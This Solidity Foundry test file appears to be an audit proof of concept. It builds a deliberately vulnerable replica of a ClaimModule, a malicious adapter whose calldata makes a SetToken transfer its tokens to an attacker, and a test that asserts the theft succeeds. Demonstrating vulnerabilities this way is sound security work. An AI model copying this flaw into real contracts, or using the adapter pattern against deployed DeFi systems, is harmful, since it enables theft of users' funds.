import "forge-std/Test.sol";

interface ISetToken {
    function invoke(address _target, uint256 _value, bytes calldata _data) external returns (bytes memory);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amt) external returns (bool);
    function mint(address to, uint256 amt) external;
}

interface IClaimAdapter {
    function getTokenAddress(address _rewardPool) external view returns (address);
    function getClaimCallData(address _setToken, address _rewardPool) external view returns (address, uint256, bytes memory);
}

// Minimal vulnerable replica
contract ClaimModule {
    mapping(address => bool) public anyoneClaim;
    mapping(address => mapping(address => bool)) public rewardPoolStatus;
    mapping(address => mapping(address => mapping(address => bool))) public claimSettingsStatus; // setToken -> rewardPool -> adapter -> bool
    mapping(bytes32 => address) public adapters; // integrationName -> adapter address

    // Allow test setup to configure state
    function setAnyoneClaim(address setToken, bool v) external { anyoneClaim[setToken] = v; }
    function addRewardPool(address setToken, address rewardPool) external { rewardPoolStatus[setToken][rewardPool] = true; }
    function addAdapterForIntegration(string calldata name, address adapter) external { adapters[keccak256(bytes(name))] = adapter; }
    function addClaimSetting(address setToken, address rewardPool, address adapter) external { claimSettingsStatus[setToken][rewardPool][adapter] = true; }

    // Vulnerable function: allows anyone when anyoneClaim is true to trigger SetToken.invoke with adapter-provided calldata
    function claim(address _setToken, address _rewardPool, string calldata _integrationName) external {
        require(rewardPoolStatus[_setToken][_rewardPool], "RewardPool not present");
        address adapter = adapters[keccak256(bytes(_integrationName))];
        require(claimSettingsStatus[_setToken][_rewardPool][adapter], "Adapter integration not present");

        IClaimAdapter adapterContract = IClaimAdapter(adapter);
        address token = adapterContract.getTokenAddress(_rewardPool);
        uint256 init = IERC20(token).balanceOf(_setToken);

        (address callTarget, uint256 callValue, bytes memory callByteData) = adapterContract.getClaimCallData(_setToken, _rewardPool);

        ISetToken(_setToken).invoke(callTarget, callValue, callByteData);

        uint256 fin = IERC20(token).balanceOf(_setToken);
        // In real contract would emit RewardClaimed with (fin - init)
        require(fin <= init + 1e30, "noop placeholder");
    }
}

// Minimal SetToken that simply performs arbitrary calls
contract MockSetToken is ISetToken {
    function invoke(address _target, uint256 _value, bytes calldata _data) external override returns (bytes memory) {
        (bool success, bytes memory ret) = _target.call{value: _value}(_data);
        require(success, "invoke failed");
        return ret;
    }
    // Allow receiving ETH if needed
    receive() external payable {}
}

// Simple ERC20 for test
contract ERC20Mock is IERC20 {
    mapping(address => uint256) public balances;
    function balanceOf(address a) external view returns (uint256) { return balances[a]; }
    function transfer(address to, uint256 amt) external returns (bool) { require(balances[msg.sender] >= amt); balances[msg.sender] -= amt; balances[to] += amt; return true; }
    function mint(address to, uint256 amt) external { balances[to] += amt; }
}

// Malicious adapter that instructs SetToken to transfer its tokens to attacker
contract MaliciousAdapter is IClaimAdapter {
    address public token;
    address public attacker;
    constructor(address _token, address _attacker) { token = _token; attacker = _attacker; }
    function getTokenAddress(address) external view override returns (address) { return token; }
    function getClaimCallData(address _setToken, address) external view override returns (address, uint256, bytes memory) {
        // Instruct SetToken to call token.transfer(attacker, amount)
        // We will transfer the entire balance by reading it in the SetToken context; since adapter cannot read SetToken's balance,
        // we'll simply transfer a fixed amount that we mint in test.
        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", attacker, 100);
        return (token, 0, data);
    }
}

contract ClaimModuleTest is Test {
    ClaimModule target;
    MockSetToken setToken;
    ERC20Mock token;
    MaliciousAdapter adapter;
    address attacker;
    address rewardPool = address(0x1234);

    function setUp() public {
        target = new ClaimModule();
        setToken = new MockSetToken();
        token = new ERC20Mock();
        attacker = makeAddr("attacker");
        // Mint tokens to SetToken
        token.mint(address(setToken), 100);
        // Deploy adapter that will cause SetToken to call token.transfer(attacker, 100)
        adapter = new MaliciousAdapter(address(token), attacker);
        // Configure module state
        target.addRewardPool(address(setToken), rewardPool);
        target.addAdapterForIntegration("MAL", address(adapter));
        target.addClaimSetting(address(setToken), rewardPool, address(adapter));
        // Allow anyone to call claim
        target.setAnyoneClaim(address(setToken), true);
    }

    function test_attacker_exploits_claim() public {
        // Attacker calls claim and causes SetToken to transfer tokens to attacker via adapter-provided calldata
        vm.prank(attacker);
        target.claim(address(setToken), rewardPool, "MAL");

        // Assert attacker received tokens
        assertEq(token.balanceOf(attacker), 100);
    }
}

